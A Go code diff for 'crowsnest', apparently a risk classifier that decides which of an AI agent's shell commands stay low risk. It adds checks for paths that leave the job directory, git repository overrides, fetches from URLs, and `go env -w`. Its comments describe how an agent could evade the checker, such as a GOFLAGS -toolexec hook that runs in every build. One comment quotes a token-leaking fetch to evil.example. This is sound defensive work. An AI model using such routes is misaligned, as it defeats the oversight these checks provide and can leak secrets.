@@ -9,6 +9,8 @@ package risk
 // a call to dangerous; this list can only keep one at low.
 
 import (
+	"path/filepath"
+	"regexp"
 	"strings"
 
 	"github.com/jclement/crowsnest/internal/guard"
@@ -34,7 +36,7 @@ var benignPrograms = map[string]bool{
 	"tr": true, "diff": true, "cmp": true, "comm": true, "tree": true, "basename": true, "dirname": true, "realpath": true,
 	"readlink": true, "test": true, "[": true, "nl": true, "column": true, "jq": true, "fd": true, "seq": true, "sleep": true,
 	"id": true, "whoami": true, "hostname": true, "uname": true, "md5sum": true, "shasum": true, "sha256sum": true,
-	"mkdir": true, "touch": true, "cd": true, "pushd": true, "popd": true, "export": true, "ping": true, "gofmt": true,
+	"mkdir": true, "touch": true, "cd": true, "pushd": true, "popd": true, "export": true, "gofmt": true,
 	"pytest": true, "find": true, // find's actions that delete, run or write are refused above
 }
 
@@ -89,6 +91,57 @@ var programWrites = map[string][]string{
 	"date":  {"-s", "--set"},
 }
 
+// clusteredOptions are the programs whose short options combine (`sort -uo FILE`, `fd -Hx rm`):
+// their clusters are taken apart before programWrites is checked (R7-S5). Go and cargo are not
+// here: go's options are single-dash words (`-count`, `-toolexec`), which would read as clusters.
+var clusteredOptions = map[string]bool{"fd": true, "rg": true, "sort": true, "tree": true, "uniq": true, "date": true}
+
+// expandClusters adds, for each `-abc` word, the single options `-a -b -c` it combines.
+func expandClusters(args []string) []string {
+	out := append([]string{}, args...)
+	for _, arg := range args {
+		if len(arg) < 3 || arg[0] != '-' || arg[1] == '-' {
+			continue
+		}
+		for _, letter := range arg[1:] {
+			out = append(out, "-"+string(letter))
+		}
+	}
+	return out
+}
+
+// outsideRoot reports whether a path an agent's command names leaves its job's directory: an
+// absolute path not inside root, a home-relative one (~) outside it, or any `..` (the OS follows
+// a link before the `..`). With no root known (the orchestrator), any absolute, ~ or .. path counts.
+func outsideRoot(path, root string) bool {
+	switch {
+	case path == "" || path == "-":
+		return false
+	case strings.HasPrefix(path, "~"):
+		return true
+	case hasDotDot(path):
+		return true
+	case !filepath.IsAbs(path):
+		return false
+	case root == "":
+		return true
+	}
+	return !inside(root, path)
+}
+
+func hasDotDot(path string) bool {
+	for _, part := range strings.Split(filepath.ToSlash(path), "/") {
+		if part == ".." {
+			return true
+		}
+	}
+	return false
+}
+
+// leavesRoot are the benign programs that write or move where their operands say (R7-S5): one
+// pointed outside the job's directory is not low.
+var leavesRoot = map[string]bool{"mkdir": true, "touch": true, "cd": true, "pushd": true}
+
 // optionHit returns the first of opts that args use, as a word or with =value glued on.
 func optionHit(args, opts []string) string {
 	for _, arg := range args {
@@ -112,8 +165,9 @@ func operands(args []string) []string {
 	return out
 }
 
-// commandShape returns why one simple command is not benign, or "" when it is.
-func commandShape(cmd guard.Command) string {
+// commandShape returns why one simple command is not benign, or "" when it is. root is the
+// job's directory ("" when unknown).
+func commandShape(cmd guard.Command, root string) string {
 	program, args := cmd.Program, cmd.Args
 	if target := outputRedirect(args); target != "" {
 		return "Writes " + target + " through a redirect"
@@ -121,19 +175,30 @@ func commandShape(cmd guard.Command) string {
 	if name := unsafeEnv(cmd.Env); name != "" {
 		return "Sets " + name + " for the command, which can change what it runs"
 	}
-	if opt := optionHit(args, programWrites[program]); opt != "" {
+	optionArgs := args
+	if clusteredOptions[program] {
+		optionArgs = expandClusters(args)
+	}
+	if opt := optionHit(optionArgs, programWrites[program]); opt != "" {
 		return program + " " + opt + " runs another program or writes a file"
+	}
+	if leavesRoot[program] {
+		for _, operand := range operands(args) {
+			if outsideRoot(operand, root) {
+				return program + " " + operand + " reaches outside the job's directory"
+			}
+		}
 	}
 	switch {
 	case program == "":
 		return ""
 	case program == "git":
-		return gitShape(guard.ParseGit(cmd))
+		return gitShape(guard.ParseGit(cmd), root)
 	case program == "sed" && hasAnyPrefix(args, "-i", "--in-place"):
 		return "sed -i edits files in place"
 	case program == "find" && hasAny(args, findWrites...):
 		return "find with an action that deletes, runs or writes (" + firstOf(args, findWrites...) + ")"
-	case program == "uniq" && len(operands(args)) > 1:
+	case program == "uniq" && len(uniqOperands(args)) > 1:
 		return "uniq with an output file writes it"
 	case program == "export" || program == "declare" || program == "typeset":
 		for _, arg := range args {
@@ -145,6 +210,10 @@ func commandShape(cmd guard.Command) string {
 		return ""
 	case benignPrograms[program]:
 		return ""
+	case program == "go" && len(args) > 0 && args[0] == "env" && hasAnyPrefix(args[1:], "-w", "-u"):
+		// go env -w persists into the human's own go environment file: GOFLAGS=-toolexec=…
+		// would then run the agent's program in every later build, crowsnest's checks included.
+		return "go env " + firstPrefix(args[1:], "-w", "-u") + " changes the go environment of every later build"
 	case buildTools[program] != nil && len(args) > 0 && buildTools[program][args[0]]:
 		return ""
 	case (program == "npm" || program == "pnpm" || program == "yarn" || program == "bun" || program == "mise") && len(args) > 1 && args[0] == "run" && scriptName(args[1]):
@@ -153,6 +222,30 @@ func commandShape(cmd guard.Command) string {
 		return ""
 	}
 	return "Runs " + program + ", which is not on crowsnest's list of harmless commands"
+}
+
+// uniqOperands are uniq's input and output operands: a lone "-" (stdin) is one, so `uniq - FILE`
+// writes FILE (R7-S5).
+func uniqOperands(args []string) []string {
+	var out []string
+	for _, arg := range args {
+		if arg == "-" || !strings.HasPrefix(arg, "-") {
+			out = append(out, arg)
+		}
+	}
+	return out
+}
+
+// firstPrefix is the first arg starting with one of prefixes ("" for none).
+func firstPrefix(args []string, prefixes ...string) string {
+	for _, arg := range args {
+		for _, prefix := range prefixes {
+			if strings.HasPrefix(arg, prefix) {
+				return arg
+			}
+		}
+	}
+	return ""
 }
 
 // scriptName reports whether a script or task name is on the benign list (test, test:unit, …).
@@ -176,12 +269,20 @@ var gitWrites = []string{"--output", "-O", "--open-files-in-pager", "--upload-pa
 
 // gitShape returns why a git command is not benign, or "". The dangerous and elevated rules of
 // the table are matched against the plain spelling separately (Classify); this decides only
-// whether the command may stay low.
-func gitShape(g guard.Git) string {
+// whether the command may stay low. root is the job's directory ("" when unknown).
+func gitShape(g guard.Git, root string) string {
 	if opt := gitOption(g); opt != "" {
 		return "git " + g.Sub + " " + opt + " writes a file or runs another program"
 	}
 	switch {
+	case g.Repo:
+		// --git-dir, --work-tree or GIT_DIR choose a repository that may be another one (R7-S5).
+		return "git with --git-dir or --work-tree may act on another repository"
+	case outsideRoot(g.Dir, root):
+		return "git -C " + g.Dir + " acts on a repository outside the job's directory"
+	case (g.Sub == "fetch" || g.Sub == "pull") && !namedRemote(g.Args):
+		// A URL (or path) instead of a configured remote can carry anything in it to anywhere.
+		return "git " + g.Sub + " from a URL or path rather than a configured remote"
 	case len(g.Config) > 0:
 		return "git with -c " + g.Config[0] + ": configuration on the command line can change what git runs (an alias, a pager, a hook path)"
 	case g.ExecPath:
@@ -208,6 +309,21 @@ func gitShape(g guard.Git) string {
 		return ""
 	}
 	return "git " + g.Sub + " is not on crowsnest's list of harmless git commands"
+}
+
+// remoteName is a configured remote's name, the only repository a low fetch names.
+var remoteName = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]*$`)
+
+// namedRemote reports whether a fetch's repository operand, if any, is a remote's name rather
+// than a URL or a path (R7-S5: `git fetch https://evil.example/<token>`).
+func namedRemote(args []string) bool {
+	for _, arg := range args {
+		if strings.HasPrefix(arg, "-") {
+			continue
+		}
+		return remoteName.MatchString(arg)
+	}
+	return true
 }
 
 // outputRedirect returns the file an output redirection in args writes ("" for none): `> f`,
